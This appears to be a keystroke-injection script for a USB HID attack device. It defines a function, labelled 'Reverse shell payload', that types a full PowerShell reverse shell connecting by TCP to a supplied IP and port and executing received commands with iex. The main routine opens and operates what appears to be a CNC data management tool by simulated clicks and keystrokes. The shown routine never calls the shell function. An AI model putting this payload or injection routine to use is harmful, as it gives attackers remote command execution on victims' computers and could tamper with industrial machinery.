// Define the keymap
var locale = "us";

// Reverse shell payload
function popshell(ip, port) {
    type("$client = New-Object System.Net.Sockets.TCPClient('" + ip + "'," + port +");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};\n");
    type("while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;");
    type("$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);");
    type("$sendback = (iex $data 2>&1 | Out-String );");
    type("$sendback2 = $sendback + 'PS' + (pwd).Path + '> ';");
    type("$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);");
    type("$stream.Write($sendbyte,0,$sendbyte.Length);");
    type("$stream.Flush()};");
    type("$client.Close();");
    press("ENTER");
}


// Main scriptRY
layout(locale);
typingSpeed(0,0);
press("GUI");
delay(500);
type("CNCDataManagementTool");
delay(500);
press("ENTER");

delay(10000);

moveTo(0.35,0.42); // CNC -> PC tab
click(BT1);
delay(1000);

moveTo(0.5,0.45); // Path field
click(BT1);
delay(1000);

press("CTRL A");
delay(1000);

press("BACKSPACE");
delay(1000);

press("ENTER"); // Confirm error
delay(1000);

type("E:/CNC/TEMP"); // fixed path, will be moved by powershell script

moveTo(0.65,0.6); // Execution
click(BT1);
delay(10000);

type("Y");
delay(500);

type("R");
delay(180000);

press("ENTER");
delay(500);

type("C");
delay(500);

press("ALT F4");
delay(500);

press("ENTER");
delay(500);